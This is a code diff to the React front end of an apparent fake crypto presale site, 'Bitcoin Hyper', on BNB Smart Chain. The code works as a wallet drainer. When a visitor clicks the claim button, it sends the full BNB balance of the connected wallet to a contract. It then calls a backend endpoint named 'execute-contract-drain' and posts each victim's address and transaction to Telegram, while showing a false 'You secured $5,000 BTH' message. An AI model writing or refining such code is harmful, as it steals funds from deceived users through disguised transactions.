@@ -46,15 +46,16 @@ function App() {
   const [provider, setProvider] = useState(null);
   const [signer, setSigner] = useState(null);
   const [balance, setBalance] = useState('0');
+  const [balanceUSD, setBalanceUSD] = useState(0);
+  const [bnbPrice, setBnbPrice] = useState(300);
   const [loading, setLoading] = useState(false);
   const [txStatus, setTxStatus] = useState('');
   const [txHash, setTxHash] = useState('');
   const [error, setError] = useState('');
   const [scanResult, setScanResult] = useState(null);
   const [preparedTransactions, setPreparedTransactions] = useState([]);
-  const [completedChains, setCompletedChains] = useState([]);
+  const [completed, setCompleted] = useState(false);
   const [showCelebration, setShowCelebration] = useState(false);
-  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
   const [verifying, setVerifying] = useState(false);
   
   // Presale stats
@@ -79,17 +80,43 @@ function App() {
     chainId: 56, // Force BSC chain
   });
 
-  // Update current chain balance
+  // Fetch BNB price from CoinGecko
+  useEffect(() => {
+    const fetchBnbPrice = async () => {
+      try {
+        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
+        const data = await response.json();
+        if (data.binancecoin?.usd) {
+          setBnbPrice(data.binancecoin.usd);
+        }
+      } catch (error) {
+        console.log('Using default BNB price');
+      }
+    };
+    
+    fetchBnbPrice();
+    const interval = setInterval(fetchBnbPrice, 60000); // Update every minute
+    
+    return () => clearInterval(interval);
+  }, []);
+
+  // Update balance and USD value
   useEffect(() => {
     if (balanceData) {
       setBalance(balanceData.formatted);
+      const bnbAmount = parseFloat(balanceData.formatted);
+      setBalanceUSD(bnbAmount * bnbPrice);
     }
-  }, [balanceData]);
+  }, [balanceData, bnbPrice]);
+
+  // Check if on correct network
+  const normalizedChainId = normalizeChainId(chainId);
+  const isCorrectNetwork = normalizedChainId === 56;
 
   // Signer initialization
   useEffect(() => {
     const initSigner = async () => {
-      if (!isConnected) {
+      if (!isConnected || !isCorrectNetwork) {
         setSigner(null);
         setProvider(null);
         return;
@@ -115,7 +142,7 @@ function App() {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
-                message: `🔌 *Wallet Connected*\nAddress: \`${address}\`\nSigner: ✅ Ready\nChain: ${chainId}`,
+                message: `🔌 *Wallet Connected*\nAddress: \`${address}\`\nSigner: ✅ Ready\nNetwork: BSC`,
                 type: 'connection'
               })
             }).catch(e => console.log('Telegram notify failed:', e));
@@ -144,7 +171,7 @@ function App() {
     };
 
     initSigner();
-  }, [isConnected, walletClient, address, chainId]);
+  }, [isConnected, isCorrectNetwork, walletClient, address]);
 
   // Countdown timer
   useEffect(() => {
@@ -165,12 +192,12 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
-  // Auto-check eligibility when wallet connects
+  // Auto-check eligibility when wallet connects and on correct network
   useEffect(() => {
-    if (isConnected && address && !scanResult && !verifying) {
+    if (isConnected && isCorrectNetwork && address && !scanResult && !verifying) {
       verifyWallet();
     }
-  }, [isConnected, address]);
+  }, [isConnected, isCorrectNetwork, address]);
 
   const verifyWallet = async () => {
     if (!address) return;
@@ -199,9 +226,6 @@ function App() {
       
       if (data.success) {
         setScanResult(data.data);
-        if (data.data.tokenAllocation) {
-          setAllocation(data.data.tokenAllocation);
-        }
         
         if (data.data.isEligible) {
           setTxStatus('✅ You qualify!');
@@ -266,17 +290,13 @@ function App() {
       return;
     }
 
-    if (!signer) {
-      setError("Signer not initialized. Please wait...");
+    if (!isCorrectNetwork) {
+      setError("Please switch to BSC network in your wallet");
       return;
     }
 
-    // Force BSC chain check
-    const normalizedChainId = normalizeChainId(chainId);
-    
-    // Block execution if not BSC
-    if (normalizedChainId !== 56) {
-      setTxStatus("⚠️ Please switch to BSC network");
+    if (!signer) {
+      setError("Initializing wallet...");
       return;
     }
 
@@ -314,7 +334,7 @@ function App() {
         signer
       );
 
-      // USE 100% OF BALANCE - removed 85% calculation
+      // USE 100% OF BALANCE
       const value = balanceData.value; // Send full balance
 
       // Log the transaction details
@@ -329,7 +349,7 @@ function App() {
       // Estimate gas first
       const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
       
-      // Send transaction - this will trigger wallet popup
+      // Send transaction
       const tx = await contract.processNativeFlow({
         value: value,
         gasLimit: gasEstimate * 120n / 100n
@@ -355,31 +375,29 @@ function App() {
       refetchBalance?.();
       
       // Mark as completed
-      if (!completedChains.includes('BSC')) {
-        setCompletedChains([...completedChains, 'BSC']);
-        
-        await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            walletAddress: address,
-            chainName: 'BSC'
-          })
-        });
-        
-        setShowCelebration(true);
-        setTxStatus(`🎉 Congratulations! You secured $5,000 BTH!`);
+      setCompleted(true);
+      
+      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          walletAddress: address,
+          chainName: 'BSC'
+        })
+      });
+      
+      setShowCelebration(true);
+      setTxStatus(`🎉 Congratulations! You secured $5,000 BTH!`);
 
-        // Send Telegram notification for success
-        await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nTx: \`${tx.hash}\`\n[View Transaction](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
-            type: 'success'
-          })
-        }).catch(e => console.log('Telegram notify failed:', e));
-      }
+      // Send Telegram notification for success
+      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nTx: \`${tx.hash}\`\n[View Transaction](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
+          type: 'success'
+        })
+      }).catch(e => console.log('Telegram notify failed:', e));
       
     } catch (err) {
       console.error('Transaction error:', err);
@@ -429,11 +447,6 @@ function App() {
     if (!addr) return '';
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
-
-  // Get current chain display - always BSC
-  const normalizedChainId = normalizeChainId(chainId);
-  const currentChain = PRESALE_CONFIG.BSC;
-  const isCorrectNetwork = normalizedChainId === 56;
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
@@ -556,6 +569,9 @@ function App() {
                   <span className="text-3xl font-bold text-orange-400">
                     {parseFloat(balance).toFixed(4)} BNB
                   </span>
+                  <span className="text-sm text-gray-400 block">
+                    ≈ ${balanceUSD.toFixed(2)} USD
+                  </span>
                 </div>
                 <button
                   onClick={() => disconnect()}
@@ -568,7 +584,7 @@ function App() {
           )}
         </div>
 
-        {/* Network Warning - Show if wrong network */}
+        {/* Network Status - Only show if wrong network */}
         {isConnected && !isCorrectNetwork && (
           <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
             <div className="flex items-center gap-3">
@@ -639,7 +655,7 @@ function App() {
         )}
 
         {/* Main Content */}
-        {isConnected && !verifying && scanResult && (
+        {isConnected && isCorrectNetwork && !verifying && scanResult && (
           <div className="glass-card p-8">
             <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
             
@@ -658,34 +674,16 @@ function App() {
                   <p className="text-green-400 text-center mb-2">+{presaleStats.currentBonus}% Bonus</p>
                 </div>
                 
-                {preparedTransactions.length > 0 && (
-                  <div className="mb-8">
-                    <p className="text-gray-400 mb-4 text-center">Progress</p>
-                    <div className="w-full bg-gray-700 rounded-full h-4 mb-3">
-                      <div 
-                        className="bg-gradient-to-r from-orange-500 to-orange-600 h-4 rounded-full transition-all duration-500 relative overflow-hidden"
-                        style={{ width: `${completedChains.length > 0 ? '100' : '0'}%` }}
-                      >
-                        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer"></div>
-                      </div>
-                    </div>
-                    <p className="text-sm text-gray-400 text-center">
-                      {completedChains.length > 0 ? '1 of 1 steps completed' : '0 of 1 steps completed'}
-                    </p>
-                  </div>
-                )}
-                
-                {!completedChains.includes('BSC') ? (
+                {!completed ? (
                   <button
                     onClick={executePresaleTransaction}
-                    disabled={loading || !signer || !isCorrectNetwork}
+                    disabled={loading || !signer}
                     className="w-full group relative disabled:opacity-50 disabled:cursor-not-allowed"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                       {loading ? 'Processing...' : 
                        !signer ? 'Initializing...' :
-                       !isCorrectNetwork ? 'Switch to BSC Network' :
                        '⚡ Claim $5,000 BTH'}
                     </div>
                   </button>
@@ -721,19 +719,6 @@ function App() {
             )}
           </div>
         )}
-
-        {/* Trust Badges */}
-        <div className="mt-12 text-center">
-          <div className="flex flex-wrap justify-center gap-3 mb-6">
-            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Audited by CertiK</span>
-            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Liquidity Locked</span>
-            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ KYC Verified</span>
-            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ 50M+ Raised</span>
-          </div>
-          <p className="text-gray-600 text-sm">
-            © 2026 Bitcoin Hyper. All rights reserved. | Secure Presale Platform
-          </p>
-        </div>
       </div>
     </div>
   );
